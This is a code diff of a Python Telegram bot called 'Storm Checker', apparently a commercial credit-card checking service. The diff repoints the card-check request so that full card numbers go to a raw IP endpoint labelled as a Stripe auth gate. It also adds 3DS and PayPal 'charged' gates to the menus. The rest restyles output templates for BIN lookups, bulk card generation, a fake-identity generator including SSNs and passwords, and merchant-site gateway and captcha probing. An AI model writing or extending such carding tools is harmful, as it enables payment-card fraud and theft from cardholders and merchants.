@@ -1304,7 +1304,7 @@ def check_au_cc(cc):
 
         try:
             # API request to AU endpoint
-            response = requests.get(f"https://darkwaslost-sr-api.onrender.com/gate=stripe3/keydarkwaslost/cc={formatted_cc}", timeout=300)
+            response = requests.get(f"http://31.97.14.173:9090/gate=stripeauth/key=darkdark/cc={formatted_cc}", timeout=300)
             if response.status_code == 200:
                 try:
                     data = response.json()
@@ -1404,17 +1404,17 @@ def format_single_response(result, user_full_name, processing_time):
 ┗━━━━━━━━━━━⊛
 
 ⌯ 𝗖𝗮𝗿𝗱
-   ↳<code>{result['card']}</code>
-⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲↣  <i>{result['gateway']}</i> 
-⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↣ <i>{result['message']}</i>
+   ↳ <code>{result['card']}</code>
+⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➳ <i>{result['gateway']}</i> 
+⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➳ <i>{result['message']}</i>
 
-⌯ 𝗜𝗻𝗳𝗼↣ {result['brand']}
-⌯ 𝐈𝐬𝐬𝐮𝐞𝐫↣ {result['type']}
-⌯ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲↣ {result['country']}
+⌯ 𝗜𝗻𝗳𝗼 ➳ {result['brand']}
+⌯ 𝐈𝐬𝐬𝐮𝐞𝐫 ➳ {result['type']}
+⌯ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➳ {result['country']}
 
-⌯ 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲↣ {user_full_name}[{user_status}]
+⌯ 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➳ {user_full_name}[{user_status}]
 ⌯ 𝐁𝐨𝐭 𝐁𝐲↣⎯꯭𖣐᪵‌ 𝑫𝒂𝒓𝒌𝒃𝒐𝒚 ◄⏤‌‌ꭙ‌‌⁷ ꯭ 𓆩⃟🦅
-⌯ 𝗧𝗶𝗺𝗲↣ {processing_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
+⌯ 𝗧𝗶𝗺𝗲 ➳ {processing_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
 """
     return response
 
@@ -1447,7 +1447,7 @@ def format_mchk_response(results, total_cards, processing_time, checked=0):
     
     for result in results:
         emoji = status_emojis.get(result['status'], '❓')
-        response += f"<code>{result['card']}</code>\n𝐒𝐭𝐚𝐭𝐮𝐬↣{emoji} {result['message']}\n──────── ⸙ ─────────\n"
+        response += f"<code>{result['card']}</code>\n𝐒𝐭𝐚𝐭𝐮𝐬➳{emoji} {result['message']}\n──────── ⸙ ─────────\n"
     
     return response
 
@@ -1720,6 +1720,10 @@ def callback_query(call):
 ✧ CMD: /mvbv [Mass]
 ✧ Status: Active ✅
 
+✧ NAME: 3DS Site Based
+✧ CMD: /svb [Single]
+✧ CMD: /msvb [Mass]
+✧ Status: Active ✅
 """,
                 reply_markup=create_auth_submenu()
             )
@@ -1789,6 +1793,11 @@ def callback_query(call):
 ✧ Status: Active ✅
 ✧ Charge: $0.5
 
+✧ NAME: Paypal Charged  
+✧ CMD: /py [Single]
+✧ CMD: /mpy [Mass]
+✧ Status: Active ✅
+✧ Charge: $0.1
 """,
                 reply_markup=create_charged_submenu()
             )
@@ -2403,14 +2412,14 @@ def handle_bin(message):
 ┃ BIN Information
 ┗━━━━━━━━━━━⊛
 
-✧ 𝐁𝐈𝐍: <code>{bin_number[:6]}</code>  
-✧ 𝐁𝐚𝐧𝐤: <code>{bin_info.get('bank', 'N/A')}</code>  
-✧ 𝐁𝐫𝐚𝐧𝐝: <code>{bin_info.get('brand', 'N/A')}</code>  
-✧ 𝐓𝐲𝐩𝐞: <code>{bin_info.get('type', 'N/A')}</code>  
-✧ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{bin_info.get('country_name', 'N/A')}</code> {bin_info.get('country_flag', '🌐')}  
-✧ 𝐋𝐞𝐯𝐞𝐥: <code>{bin_info.get('level', 'N/A')}</code>  
+✧ 𝐁𝐈𝐍 ➳ <code>{bin_number[:6]}</code>  
+✧ 𝐁𝐚𝐧𝐤 ➳ <code>{bin_info.get('bank', 'N/A')}</code>  
+✧ 𝐁𝐫𝐚𝐧𝐝 ➳ <code>{bin_info.get('brand', 'N/A')}</code>  
+✧ 𝐓𝐲𝐩𝐞 ➳ <code>{bin_info.get('type', 'N/A')}</code>  
+✧ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➳ <code>{bin_info.get('country_name', 'N/A')}</code> {bin_info.get('country_flag', '🌐')}  
+✧ 𝐋𝐞𝐯𝐞𝐥 ➳ <code>{bin_info.get('level', 'N/A')}</code>  
 
-✧ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: <code>{message.from_user.first_name}</code>
+✧ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 ➳ <code>{message.from_user.first_name}</code>
 
 """
                 bot.edit_message_text(chat_id=message.chat.id,
@@ -3967,10 +3976,10 @@ def handle_gen(message):
 {formatted_ccs}
 
 <pre>BIN-LOOKUP
-BIN: {bin_input}
-Country: {country_name} {flag}
-Type: {card_type}
-Bank: {bank}</pre>
+BIN ➳ {bin_input}
+Country ➳ {country_name} {flag}
+Type ➳ {card_type}
+Bank ➳ {bank}</pre>
 """
                         bot.edit_message_text(chat_id=message.chat.id,
                                             message_id=status_msg.message_id,
@@ -4031,10 +4040,10 @@ Bank: {bank}</pre>
                             bot.send_document(message.chat.id, f, caption=f"""
 Generated {count} CCs 💳
 ━━━━━━━━━━━━━━━━━━
-BIN: {bin_input}
-Country: {country_name} {flag}
-Type: {card_type}
-Bank: {bank}
+BIN ➳ {bin_input}
+Country ➳ {country_name} {flag}
+Type ➳ {card_type}
+Bank ➳ {bank}
 ━━━━━━━━━━━━━━━━━━
 """)
                         
@@ -4089,16 +4098,16 @@ def handle_info(message):
 ┃ 𝐔𝐬𝐞𝐫 𝐈𝐧𝐟𝐨
 ┗━━━━━━━━━━━⊛
 
-✧ Name: {first_name} {last_name}
-✧ Username: {username}
-✧ User ID: <code>{user_id}</code>
-✧ Chat ID: <code>{chat_id}</code>
-✧ Member Since: {member_since}
+✧ Name ➳ {first_name} {last_name}
+✧ Username ➳ {username}
+✧ User ID ➳ <code>{user_id}</code>
+✧ Chat ID ➳ <code>{chat_id}</code>
+✧ Member Since ➳ {member_since}
 
-✧ Status: {plan_info}
-✧ Credits: {credits_display}
+✧ Status ➳ {plan_info}
+✧ Credits ➳ {credits_display}
 
-✧ Bot By: ⎯꯭𖣐᪵̽𐎓⏤‌‌𝑫𝒂𝒓𝒌𝒃𝒐𝒚 ◄⏤‌‌ꭙ‌‌⁷ ꯭ ꯭𖠌𝆺꯭𝅥᪳𝆭࿐ 𓆩⃟🦅
+✧ Bot By ➳ ⎯꯭𖣐᪵̽𐎓⏤‌‌𝑫𝒂𝒓𝒌𝒃𝒐𝒚 ◄⏤‌‌ꭙ‌‌⁷ ꯭ ꯭𖠌𝆺꯭𝅥᪳𝆭࿐ 𓆩⃟🦅
 """
         bot.reply_to(message, response, parse_mode='HTML')
 
@@ -4130,13 +4139,13 @@ def handle_ping(message):
         response = f"""
 ✦ 𝑺𝒕𝒐𝒓𝒎 ✗ 𝘾𝙝𝙚𝙘𝙠𝙚𝙧 𖤐 is running...
 
-✧ Ping: <code>{realping} ms</code>
-✧ Up Time: <code>{uptime_str}</code>
-✧ CPU Usage: <code>{cpu}%</code>
-✧ RAM Usage: <code>{memory}%</code>
-✧ System: <code>{system} ({arch})</code>
+✧ Ping ➳ <code>{realping} ms</code>
+✧ Up Time ➳ <code>{uptime_str}</code>
+✧ CPU Usage ➳ <code>{cpu}%</code>
+✧ RAM Usage ➳ <code>{memory}%</code>
+✧ System ➳ <code>{system} ({arch})</code>
 
-✧ Bot By: ⎯꯭𖣐᪵̽𐎓⏤‌‌𝑫𝒂𝒓𝒌𝒃𝒐𝒚 ◄⏤‌‌ꭙ‌‌⁷ ꯭ ꯭𖠌𝆺꯭𝅥᪳𝆭࿐ 𓆩⃟🦅
+✧ Bot By ➳ ⎯꯭𖣐᪵̽𐎓⏤‌‌𝑫𝒂𝒓𝒌𝒃𝒐𝒚 ◄⏤‌‌ꭙ‌‌⁷ ꯭ ꯭𖠌𝆺꯭𝅥᪳𝆭࿐ 𓆩⃟🦅
 """
         bot.reply_to(message, response, parse_mode="HTML")
         
@@ -4188,8 +4197,8 @@ def handle_myplan(message):
 ┃ Your Current Plan
 ┗━━━━━━━━━━━━━⊛
 
-✧ Plan Type: <b>{plan_name}</b>
-✧ Expiry Date: <code>{expiry}</code>
+✧ Plan Type ➳ <b>{plan_name}</b>
+✧ Expiry Date ➳ <code>{expiry}</code>
 
 - Enjoy Unlimited CC Checks & Exclusive Features!
 """
@@ -4231,12 +4240,12 @@ def handle_stats(message):
 ┃ Bot Statics 
 ┗━━━━━━━━━━━⊛
 
-✧ Total Users       : <code>{total_users}</code>
-✧ Subscribed Users  : <code>{subscribed_users}</code>
-✧ Checks Today      : <code>{total_checks_today}</code>
-✧ Approved Cards    : <code>{approved}</code>
-✧ Declined Cards    : <code>{declined}</code>
-✧ Redeemed Credits  : <code>{total_redeemed}</code>
+✧ Total Users       ➳ <code>{total_users}</code>
+✧ Subscribed Users  ➳ <code>{subscribed_users}</code>
+✧ Checks Today      ➳ <code>{total_checks_today}</code>
+✧ Approved Cards    ➳ <code>{approved}</code>
+✧ Declined Cards    ➳ <code>{declined}</code>
+✧ Redeemed Credits  ➳ <code>{total_redeemed}</code>
 """
         bot.reply_to(message, response.strip(), parse_mode='HTML')
 
@@ -4322,14 +4331,14 @@ def handle_gate_check(message):
 ┃ 𝗟𝗼𝗼𝗸𝘂𝗽 𝗥𝗲𝘀𝘂𝗹𝘁  ✅ 
 ┗━━━━━━━━━━━━⊛
 ─━─━─━─━─━─━─━─━─━─
-✧ 𝗦𝗶𝘁𝗲 -» <code>{final_url}</code> 
-✧ 𝗣𝗮𝘆𝗺𝗲𝗻𝘁 𝗚𝗮𝘁𝗲𝘄𝗮𝘆𝘀 -» <code>{gateways}</code> 
-✧ 𝗖𝗮𝗽𝘁𝗰𝗵𝗮 -» <code>{captcha}</code> 
-✧ 𝗖𝗹𝗼𝘂𝗱𝗳𝗹𝗮𝗿𝗲 -» <code>{cloudflare}</code> 
-✧ 𝗦𝗲𝗰𝘂𝗿𝗶𝘁𝘆 -» {security}
-✧ 𝗖𝗩𝗩/𝗖𝗩𝗖 -» {cvv}
-✧ 𝗜𝗻𝗯𝘂𝗶𝗹𝘁 𝗦𝘆𝘀𝘁𝗲𝗺 -» {inbuilt}
-✧ 𝗦𝘁𝗮𝘁𝘂𝘀 -» {status_code}
+✧ 𝗦𝗶𝘁𝗲 ➳ <code>{final_url}</code> 
+✧ 𝗣𝗮𝘆𝗺𝗲𝗻𝘁 𝗚𝗮𝘁𝗲𝘄𝗮𝘆𝘀 ➳ <code>{gateways}</code> 
+✧ 𝗖𝗮𝗽𝘁𝗰𝗵𝗮 ➳ <code>{captcha}</code> 
+✧ 𝗖𝗹𝗼𝘂𝗱𝗳𝗹𝗮𝗿𝗲 ➳ <code>{cloudflare}</code> 
+✧ 𝗦𝗲𝗰𝘂𝗿𝗶𝘁𝘆 ➳ {security}
+✧ 𝗖𝗩𝗩/𝗖𝗩𝗖 ➳ {cvv}
+✧ 𝗜𝗻𝗯𝘂𝗶𝗹𝘁 𝗦𝘆𝘀𝘁𝗲𝗺 ➳ {inbuilt}
+✧ 𝗦𝘁𝗮𝘁𝘂𝘀 ➳ {status_code}
 ─━─━─━─━─━─━─━─━─━─
 """
         bot.edit_message_text(chat_id=message.chat.id,
@@ -4405,32 +4414,32 @@ def handle_fake(message):
 ┃ Fake Identity 
 ┗━━━━━━━━━━━⊛
 
-✧ Name      : <code>{name}</code>
-✧ Street    : <code>{street}</code>
-✧ Address 2 : <code>{address2}</code>
-✧ City      : <code>{city}</code>
-✧ State     : <code>{state}</code> (<code>{state_abbr}</code>)
-✧ Country   : <code>{country}</code>
-✧ ZIP Code  : <code>{zip_code}</code>
+✧ Name      ➳ <code>{name}</code>
+✧ Street    ➳ <code>{street}</code>
+✧ Address 2 ➳ <code>{address2}</code>
+✧ City      ➳ <code>{city}</code>
+✧ State     ➳ <code>{state}</code> (<code>{state_abbr}</code>)
+✧ Country   ➳ <code>{country}</code>
+✧ ZIP Code  ➳ <code>{zip_code}</code>
 
-✧ Email     : <code>{email}</code>
-✧ Phone     : <code>{phone}</code>
-✧ DOB       : <code>{dob}</code>
-✧ Company   : <code>{company}</code>
-✧ Job Title : <code>{job}</code>
-✧ SSN/ID    : <code>{ssn}</code>
-✧ National ID : <code>{national_id}</code>
-✧ IP Address  : <code>{ip}</code>
+✧ Email     ➳ <code>{email}</code>
+✧ Phone     ➳ <code>{phone}</code>
+✧ DOB       ➳ <code>{dob}</code>
+✧ Company   ➳ <code>{company}</code>
+✧ Job Title ➳ <code>{job}</code>
+✧ SSN/ID    ➳ <code>{ssn}</code>
+✧ National ID ➳ <code>{national_id}</code>
+✧ IP Address  ➳ <code>{ip}</code>
 
-✧ Username  : <code>{username}</code>
-✧ Password  : <code>{password}</code>
-✧ Website   : <code>{website}</code>
+✧ Username  ➳ <code>{username}</code>
+✧ Password  ➳ <code>{password}</code>
+✧ Website   ➳ <code>{website}</code>
 
-✧ Credit Card : <code>{cc_number}</code>
-✧ PAN Number  : <code>{pan_number}</code>
+✧ Credit Card ➳ <code>{cc_number}</code>
+✧ PAN Number  ➳ <code>{pan_number}</code>
 
-✧ Device Name : <code>{device}</code>
-✧ User-Agent  : <code>{user_agent}</code>
+✧ Device Name ➳ <code>{device}</code>
+✧ User-Agent  ➳ <code>{user_agent}</code>
 """
         bot.reply_to(message, msg.strip(), parse_mode="HTML")
 
@@ -5505,15 +5514,15 @@ def handle_lk(message):
 ┃ 𝗕𝗜𝗡 𝗟𝗼𝗼𝗸𝘂𝗽 ✅
 ┗━━━━━━━━━━━⊛
 
-❖ 𝗖𝗔𝗥𝗗: <code>{card_number}</code>
-❖ 𝗩𝗔𝗟𝗜𝗗: ✅
-❖ 𝗘𝗫𝗣𝗜𝗥𝗬: {month}/{year}
+❖ 𝗖𝗔𝗥𝗗 ➳ <code>{card_number}</code>
+❖ 𝗩𝗔𝗟𝗜𝗗 ➳ ✅
+❖ 𝗘𝗫𝗣𝗜𝗥𝗬 ➳ {month}/{year}
 
-❖ 𝗕𝗜𝗡: <code>{bin_number}</code>
-❖ 𝗕𝗔𝗡𝗞: {issuing_bank}
-❖ 𝗕𝗥𝗔𝗡𝗗: {card_brand}
-❖ 𝗧𝗬𝗣𝗘: {card_type}
-❖ 𝗖𝗢𝗨𝗡𝗧𝗥𝗬: {country} {flag}
+❖ 𝗕𝗜𝗡 ➳ <code>{bin_number}</code>
+❖ 𝗕𝗔𝗡𝗞 ➳ {issuing_bank}
+❖ 𝗕𝗥𝗔𝗡𝗗 ➳ {card_brand}
+❖ 𝗧𝗬𝗣𝗘 ➳ {card_type}
+❖ 𝗖𝗢𝗨𝗡𝗧𝗥𝗬 ➳ {country} {flag}
 """
                 bot.edit_message_text(chat_id=message.chat.id,
                                       message_id=status_msg.message_id,
